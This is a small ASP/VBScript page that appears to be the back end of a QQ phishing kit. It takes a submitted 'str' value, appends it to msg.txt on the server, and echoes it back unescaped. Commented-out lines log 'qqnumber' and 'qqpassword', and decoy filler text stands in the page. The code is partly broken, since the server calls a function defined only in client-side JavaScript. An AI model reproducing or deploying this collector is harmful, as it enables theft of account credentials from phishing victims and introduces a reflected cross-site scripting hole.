 <%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%><head runat="server">
<script type="text/javascript" >
function msg(str)
{
	 return decodeURL(str);	
}
</script>
</head>
<%


str=request("str")
'pass=request("pass")
set fs=server.CreateObject("Scripting.FileSystemObject")
set file=fs.OpenTextFile(server.MapPath("msg.txt"),8,True)
'file.writeline qqnumber+"---"+"-"+qqpassword
str=msg(str)
if str><"" then
	file.writeline str
	file.close
	response.write "Send OK!" & "<p>" & str &"</a>"

	else
    response.Write("<p>有没有那么一首歌，会让你永远不记得我</p>")
	end if
	
set file=nothing
set fs=nothing


%>


 
<a>euya wwsk djya ywyg gjg ddpd </a>
<p>But what are U doing here</p>
<!--<script type="text/javascript">window.close()</script>-->